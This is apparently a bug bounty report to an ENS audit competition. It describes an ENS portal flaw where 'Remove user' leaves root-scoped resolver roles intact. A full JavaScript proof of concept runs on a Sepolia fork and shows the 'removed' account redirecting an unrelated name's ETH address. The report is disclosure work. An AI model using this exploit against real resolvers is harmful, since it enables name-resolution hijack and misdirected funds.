# 92714 w a critical resolver remove user silently no ops root scoped roles enables persistent ens name resolution hijack

**Submitted on Sep 11th 2026 at 19:23:43 UTC by @W3B\_SR\_0xki for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92714
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

`apps/portal`'s Resolver Roles UI lets an admin grant and revoke per-account permissions on a `PermissionedResolver` at two levels of granularity: **root** scope (applies to every name under that resolver) and **name** scope (applies to one specific name). When an account holds grants at *both* levels simultaneously, the sidebar's "Remove user" action — whose confirm dialog explicitly promises *"remove this user from all roles... cannot be undone"* — only ever revokes the account's **name-scoped** resource. The root-scoped grant is left completely untouched. An account the admin believes has been fully removed retains its original root authority and can continue writing records — including redirecting any other name's address record to itself — for as long as no one notices.

Confirmed live against a fork of the real, currently-deployed Sepolia contracts (see Proof of Concept): after the exact "Remove user" transaction the app would send, the removed account still holds its root role, and successfully used it to redirect an unrelated name's ETH address record to itself.

## Assets Affected

* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx` (root cause, lines 169, 295-323, 444-448)
* `apps/portal/src/lib/roles/resolverRoles.ts` (`groupRolesByAccount`, lines 179-221 — the multi-resource merge that feeds the bug)
* `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts` (lines 41-60 — the mis-scoped revoke actually submitted)
* `apps/portal/src/features/resolver/helpers/prepareResolverRolesIntent.ts` (lines 32-76 — wires the sidebar's action straight through to the revoke helper with no additional scoping logic)

## Vulnerability Details

### Root cause

`groupRolesByAccount` merges an account's role grants across *every* EAC resource it holds on a resolver — root and any number of per-name resources — into a single row, flattening all bitmaps into one `decodedRoles` array while discarding which resource each role actually came from at the point the sidebar consumes it:

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:193-215 (groupRolesByAccount)
for (const role of roles) {
  const account = role.account.toLowerCase()
  const resource = role.resource.toLowerCase()
  const decoded = decodeResolverRoleBitmap(role.roleBitmap)
  ...
  if (existing) {
    existing.roles.push(role)
    existing.decodedRoles.push(...decoded)   // <- flattened across ALL resources
    if (resolvedName) existing.resolvedNames.add(resolvedName)
  }
  ...
}
```

`AccountRoleGroup.roles` still retains the original per-resource entries, but `ResolverRolesSidebar.tsx` never reads it — only `.account`, `.decodedRoles`, and `.resolvedNames` are destructured. Instead the sidebar derives a single target name for **every** action on the row:

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-169
const selectedAccount = row?.original.account as Address
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []

const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

If the account holds a root-scoped role *and* a name-scoped role, `resolvedNames` contains both `'(root)'` and the name — `.find(n => n !== '(root)')` always prefers the name, discarding root. This `roleName` is used identically for both "Save changes" and "Remove user":

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:307-323
const handleRemoveUser = () => {
  ...
  setPendingAction({
    type: 'remove',
    name: roleName,          // <- the one derived name, never '(root)' when a name exists
    account: selectedAccount,
    roles: decodedRoles,     // <- ALL roles, merged across every resource
  })
  openModal()
}
```

which flows through `prepareResolverRolesIntent` unmodified into `revokeResolverRoles`:

```ts
// apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-60
const writeParams = revokeResolverRolesWriteParameters(
  walletClient,
  name === ''
    ? { resolverAddress, targetAccount: account, scope: 'root', roles }
    : { resolverAddress, targetAccount: account, scope: 'name', name, roles },
)
```

Because `name` (`roleName`) is non-empty whenever the account holds any name-scoped role, the revoke **always** takes the `scope: 'name'` branch — even though `roles` includes bits that were only ever granted at root. On `PermissionedResolver`, name-scoped revocation (`authorizeNameRoles(..., grant=false)`) only clears the name's own resource; it cannot touch a separate root-resource grant. The root bits are untouched.

The confirm dialog compounds the problem by making an unconditional claim the code does not fulfill:

```tsx
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:444-448
<DialogTitle>Remove user</DialogTitle>
<DialogDescription>
  Are you sure you want to remove this user from all roles? This
  action cannot be undone.
</DialogDescription>
```

## Impact

An admin who grants a delegate broad (root) access and later also grants them a narrower, name-specific role — an entirely ordinary use of the resolver's supported per-name vs. global scoping — cannot fully revoke that delegate through the app. "Remove user" silently leaves root authority intact. The delegate can continue to call any root-gated resolver function (`setAddr`, `setText`, `setContenthash`, etc.) against **any name** under that resolver, including names it was never individually granted access to. Demonstrated concretely in the PoC below: the "removed" account redirects an unrelated name's ETH address record to itself — a live, on-chain ENS name-resolution hijack, indefinitely, until an admin happens to re-check the role state through some other means.

This matches the program's own listed impact categories:

* *"Causing the application to display or pre-fill an incorrect address... resolving or rendering an ENS name to an attacker-controlled address"* — exactly what the PoC's final state shows.
* *"Unauthorized takeover of... authenticated session... extending or widening a session key's authority beyond its intended scope"* — the root grant surviving a claimed full revocation is authority persisting beyond its intended (revoked) lifetime.

## Recommendation

* `ResolverRolesSidebar` should build one grant/revoke transaction **per resource** the account actually holds roles at, using the per-resource `AccountRoleGroup.roles` array it already receives but currently discards — not a single derived `roleName`.
* Until that's implemented, at minimum: when `resolvedNames.length > 1`, disable "Remove user" (and "Save changes" for revocations) and require the admin to address each resource individually, with the confirm dialog and the `"Global roles (all names)"` / `"Roles scoped to ..."` label corrected to state precisely what will change.
* Note: the sibling `apps/portal/src/features/roles/components/RolesSidebar.tsx` (registry/name-level roles, a different feature) does **not** exhibit this pattern — it snapshots the target account at click-time rather than deriving a merged resource name, so this appears isolated to the resolver feature specifically.

## Proof of Concept

## Proof of Concept

Executed live against `anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com` — a fork of **real, currently-deployed Sepolia state**, so every call below hit the actual deployed `VerifiableFactory` (`0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`) and `PermissionedResolver` implementation (`0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`), not a mock. All calldata was built with the real `@ensdomains/ensjs` `grantResolverRolesWriteParameters` / `revokeResolverRolesWriteParameters` functions — the exact functions `apps/portal`'s own `grantResolverRoles.ts` / `revokeResolverRoles.ts` call — so the transactions sent are byte-identical to what the app would send.

**Setup**: deployed a fresh `PermissionedResolver` proxy. Admin = account A (`0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`), delegate = account X (`0x70997970C51812dc3A010C7d01b50e0d17dc79C8`).

**Step 1** — A grants X `ROLE_SET_ADDR` at **root** scope:

```
tx grantRootRoles(ROLE_SET_ADDR, X):
0x292a22c5ddad104b70ac5f14ccad9e3caf731cb870873f99798588c4caa0986d -> status=success
```

**Step 2** — A also grants X `ROLE_SET_TEXT` scoped only to `attacker-victim-poc.eth`:

```
tx authorizeNameRoles(attacker-victim-poc.eth, ROLE_SET_TEXT, X, true):
0xc1897121230c685c21b1babf345fee623eab04888cf83daa43b68eb688cd46a5 -> status=success
```

**Before removal**:

```
hasRootRoles(ROLE_SET_ADDR, X) = true
```

**Step 3** — A clicks "Remove user" for X in the app. Replicated `ResolverRolesSidebar.tsx`'s logic exactly:

```
decodedRoles = ['ROLE_SET_ADDR', 'ROLE_SET_TEXT']       (merged across BOTH resources)
resolvedNames = ['(root)', 'attacker-victim-poc.eth']
roleName = resolvedNames.find(n => n !== '(root)') = 'attacker-victim-poc.eth'
-> revokeResolverRoles({ name: roleName, roles: decodedRoles })
```

which submits — exactly as the app would:

```
tx authorizeNameRoles(attacker-victim-poc.eth, [ROLE_SET_ADDR,ROLE_SET_TEXT], X, false):
0x2e1165c49b7cb34680ce0e26726cb58c1368e3d4883876522bfdb2931e92fd01 -> status=success
```

**After removal**:

```
hasRootRoles(ROLE_SET_ADDR, X) = true          <-- UNCHANGED. Bug confirmed.
```

**Step 4 (impact)** — X, the "removed" account, exercises the surviving root grant against `innocent-bystander-poc.eth` — a name it was never individually granted anything on:

```
tx setAddr(innocent-bystander-poc.eth, ETH, X.address):
0x5a97f3aa4cad44e7cadbe054a630ec11e7ec9029b7a488e5187a998cf94322cd -> status=success
```

**Final read-back**:

```
addr(innocent-bystander-poc.eth) now resolves to: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

X — the account the admin explicitly "removed" via the app's own confirm dialog ("remove this user from all roles... cannot be undone") — unilaterally redirected an unrelated name's ETH address record to itself, using authority the UI told the admin had been stripped.

```javascript
import {
  grantResolverRolesWriteParameters,
  revokeResolverRolesWriteParameters,
} from '@ensdomains/ensjs/wallet/v2'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  createPublicClient,
  createWalletClient,
  http,
  encodeFunctionData,
  encodeEventTopics,
  decodeEventLog,
  namehash,
  parseAbi,
  defineChain,
} from 'viem'
import { mnemonicToAccount } from 'viem/accounts'
import { packetToBytes } from 'viem/ens'

const RPC = 'http://127.0.0.1:8555'

const localSepolia = defineChain({
  id: 11155111,
  name: 'anvil-sepolia-fork',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [RPC] } },
})

// Well-known Anvil/Hardhat default test mnemonic (public, test-only, ships
// with every EVM dev tool — anvil's own default accounts derive from it).
const MNEMONIC = 'test test test test test test test test test test test junk'
const ADMIN = mnemonicToAccount(MNEMONIC, { addressIndex: 0 }) // resolver deployer / root admin
const X = mnemonicToAccount(MNEMONIC, { addressIndex: 1 }) // the delegate that gets "removed"

const publicClient = createPublicClient({ chain: localSepolia, transport: http(RPC) })
const adminClient = createWalletClient({ account: ADMIN, chain: localSepolia, transport: http(RPC) })
const xClient = createWalletClient({ account: X, chain: localSepolia, transport: http(RPC) })

const s = ensL1Contracts[supportedL1Chains.sepolia]
const VERIFIABLE_FACTORY = s.ensVerifiableFactory.address
const RESOLVER_IMPL = s.ensPermissionedResolverImpl.address

const VERIFIABLE_FACTORY_ABI = parseAbi([
  'function deployProxy(address implementation, uint256 salt, bytes data) returns (address)',
])
const RESOLVER_INIT_ABI = parseAbi([
  'function initialize(address owner, uint256 bitmap, bytes[] setters)',
])
const HAS_ROOT_ROLES_ABI = parseAbi([
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
])
const ROLES_ABI = parseAbi([
  'function roles(uint256 resource, address account) view returns (uint256)',
])
const SET_ADDR_ABI = parseAbi([
  'function setAddr(bytes32 node, uint256 coinType, bytes a)',
])
const GET_ADDR_ABI = parseAbi([
  'function addr(bytes32 node) view returns (address)',
])

const ROLES_ALL = 0x1111111111111111111111111111111111111111111111111111111111111111n
const ROLE_SET_ADDR = 1n << 0n
const ROLE_SET_TEXT = 1n << 4n
const COIN_TYPE_ETH = 60n

function dnsEncode(name) {
  return `0x${Buffer.from(packetToBytes(name)).toString('hex')}`
}

async function waitTx(hash, label) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  console.log(`  tx ${label}: ${hash} -> status=${receipt.status}`)
  if (receipt.status !== 'success') throw new Error(`${label} reverted`)
  return receipt
}

async function main() {
  console.log('=== Setup: fund X for gas, deploy a fresh PermissionedResolver ===')
  await adminClient.sendTransaction({ to: X.address, value: 10n ** 18n })

  const salt = BigInt(Date.now()) // unique per run
  const initData = encodeFunctionData({
    abi: RESOLVER_INIT_ABI,
    functionName: 'initialize',
    args: [ADMIN.address, ROLES_ALL, []],
  })
  const deployHash = await adminClient.writeContract({
    address: VERIFIABLE_FACTORY,
    abi: VERIFIABLE_FACTORY_ABI,
    functionName: 'deployProxy',
    args: [RESOLVER_IMPL, salt, initData],
  })
  const deployReceipt = await waitTx(deployHash, 'deployProxy')
  // The newly deployed PermissionedResolver proxy emits its own init-related
  // events (role grants during `initialize`) in the same receipt; its address
  // is simply the log source that ISN'T the VerifiableFactory itself.
  const proxyLog = deployReceipt.logs.find(
    (l) => l.address.toLowerCase() !== VERIFIABLE_FACTORY.toLowerCase(),
  )
  const RESOLVER = proxyLog.address
  console.log(`  deployed PermissionedResolver at ${RESOLVER}`)
  console.log(`  admin (deployer): ${ADMIN.address}`)
  console.log(`  X (delegate to be "removed"): ${X.address}`)

  const POC_NAME = 'attacker-victim-poc.eth'
  const OTHER_NAME = 'innocent-bystander-poc.eth'

  console.log('\n=== Step 1: admin grants X ROLE_SET_ADDR at ROOT scope (global) ===')
  {
    const wp = grantResolverRolesWriteParameters(adminClient, {
      resolverAddress: RESOLVER,
      targetAccount: X.address,
      scope: 'root',
      roles: ['ROLE_SET_ADDR'],
    })
    const hash = await adminClient.writeContract(wp)
    await waitTx(hash, 'grantRootRoles(ROLE_SET_ADDR, X)')
  }

  console.log(`\n=== Step 2: admin ALSO grants X ROLE_SET_TEXT scoped only to "${POC_NAME}" ===`)
  {
    const wp = grantResolverRolesWriteParameters(adminClient, {
      resolverAddress: RESOLVER,
      targetAccount: X.address,
      scope: 'name',
      name: POC_NAME,
      roles: ['ROLE_SET_TEXT'],
    })
    const hash = await adminClient.writeContract(wp)
    await waitTx(hash, `authorizeNameRoles(${POC_NAME}, ROLE_SET_TEXT, X, true)`)
  }

  const hasRootBefore = await publicClient.readContract({
    address: RESOLVER,
    abi: HAS_ROOT_ROLES_ABI,
    functionName: 'hasRootRoles',
    args: [ROLE_SET_ADDR, X.address],
  })
  console.log(`\n  BEFORE removal — hasRootRoles(ROLE_SET_ADDR, X) = ${hasRootBefore}`)

  console.log(
    '\n=== Step 3: admin clicks "Remove user" in the app for X ===\n' +
      '  (replicating ResolverRolesSidebar.tsx:169,307-323 EXACTLY:\n' +
      "   decodedRoles = ['ROLE_SET_ADDR','ROLE_SET_TEXT']  (merged across BOTH resources)\n" +
      "   resolvedNames = ['(root)', '" + POC_NAME + "']\n" +
      "   roleName = resolvedNames.find(n => n !== '(root)') = '" + POC_NAME + "'\n" +
      '   -> revokeResolverRoles({ name: roleName, roles: decodedRoles }))',
  )
  {
    // This is EXACTLY revokeResolverRolesWriteParameters with scope:'name',
    // called with the app's OWN merged decodedRoles array — not a hand-picked
    // subset. name !== '' so the app takes the scope:'name' branch.
    const wp = revokeResolverRolesWriteParameters(adminClient, {
      resolverAddress: RESOLVER,
      targetAccount: X.address,
      scope: 'name',
      name: POC_NAME,
      roles: ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'],
    })
    const hash = await adminClient.writeContract(wp)
    await waitTx(hash, `authorizeNameRoles(${POC_NAME}, [ROLE_SET_ADDR,ROLE_SET_TEXT], X, false)  <- the app's "Remove user" tx`)
  }

  console.log('\n=== Step 4: read root-scope state AFTER "Remove user" ===')
  const hasRootAfter = await publicClient.readContract({
    address: RESOLVER,
    abi: HAS_ROOT_ROLES_ABI,
    functionName: 'hasRootRoles',
    args: [ROLE_SET_ADDR, X.address],
  })
  console.log(`  AFTER removal  — hasRootRoles(ROLE_SET_ADDR, X) = ${hasRootAfter}`)

  if (hasRootAfter !== true) {
    console.log('\nBUG NOT REPRODUCED (root role was actually revoked) — investigate before reporting.')
    process.exit(1)
  }

  console.log(
    '\n*** BUG CONFIRMED: X\'s ROOT-scoped ROLE_SET_ADDR survived the "Remove user" action. ***',
  )

  console.log(
    `\n=== Step 5 (impact): X exercises the surviving root grant against a name it was\n` +
      `    NEVER individually granted anything on — "${OTHER_NAME}" — and points its ETH\n` +
      `    address record at itself, as if the "removed" user were never removed. ===`,
  )
  {
    const node = namehash(OTHER_NAME)
    const hash = await xClient.writeContract({
      address: RESOLVER,
      abi: SET_ADDR_ABI,
      functionName: 'setAddr',
      args: [node, COIN_TYPE_ETH, X.address],
    })
    await waitTx(hash, `setAddr(${OTHER_NAME}, ETH, X.address)  <- sent by X, post-"removal"`)
  }
  console.log(
    `\n*** X — an account the admin explicitly "removed" via the app's own confirm dialog\n` +
      `    ("remove this user from all roles... cannot be undone") — just unilaterally set\n` +
      `    the ETH address record for a completely unrelated name to its own address,\n` +
      `    using authority the UI told the admin had been stripped. ***`,
  )

  console.log('\n=== Step 6 (read-back): confirm the hijacked resolution on-chain ===')
  const resolved = await publicClient.readContract({
    address: RESOLVER,
    abi: GET_ADDR_ABI,
    functionName: 'addr',
    args: [namehash(OTHER_NAME)],
  })
  console.log(`  addr(${OTHER_NAME}) now resolves to: ${resolved}`)
  if (resolved.toLowerCase() !== X.address.toLowerCase()) {
    console.log('\nREAD-BACK MISMATCH — investigate before reporting.')
    process.exit(1)
  }
  console.log('\n*** Confirmed: name resolution hijacked to the attacker-controlled address. ***')
}

main().catch((e) => {
  console.error('PoC FAILED:', e)
  process.exit(1)
})
```
